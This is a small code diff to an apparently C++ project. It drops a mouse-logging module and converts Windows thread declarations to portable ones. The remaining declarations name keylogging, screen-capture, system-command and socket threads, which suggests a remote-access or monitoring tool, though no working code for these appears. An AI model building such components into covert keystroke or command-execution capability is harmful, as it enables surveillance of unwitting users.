@@ -17,7 +17,8 @@
 #include <cstdio>
 #include <stdio.h>
 #include <time.h>
-#include <set>
+#include <stack>
+#include <stdint.h>
 #include <queue>
 #include <vector>
 
@@ -25,7 +26,6 @@
 #include "mutex.h"
 #include "tcpsocket.h"
 #include "keylog.h"
-#include "mouselog.h"
 #include "screen.h"
 #include "sysexec.h"
 #include "fs.h"
@@ -37,13 +37,11 @@
 
 void addonDebug(char *text, ...);
 
-DWORD __stdcall main_thread(LPVOID lpParam);
-DWORD __stdcall process_thread(LPVOID lpParam);
+DWORD main_thread(void *lpParam);
+DWORD process_thread(void *lpParam);
 
-DWORD __stdcall socket_send_thread(LPVOID lpParam);
-DWORD __stdcall socket_receive_thread(LPVOID lpParam);
+DWORD socket_send_thread(void *lpParam);
+DWORD socket_receive_thread(void *lpParam);
 
-DWORD __stdcall keylog_thread(LPVOID lpParam);
-DWORD __stdcall mouselog_thread(LPVOID lpParam);
-
-DWORD __stdcall sysexec_thread(LPVOID lpParam);
+DWORD keylog_thread(void *lpParam);
+DWORD sysexec_thread(void *lpParam);
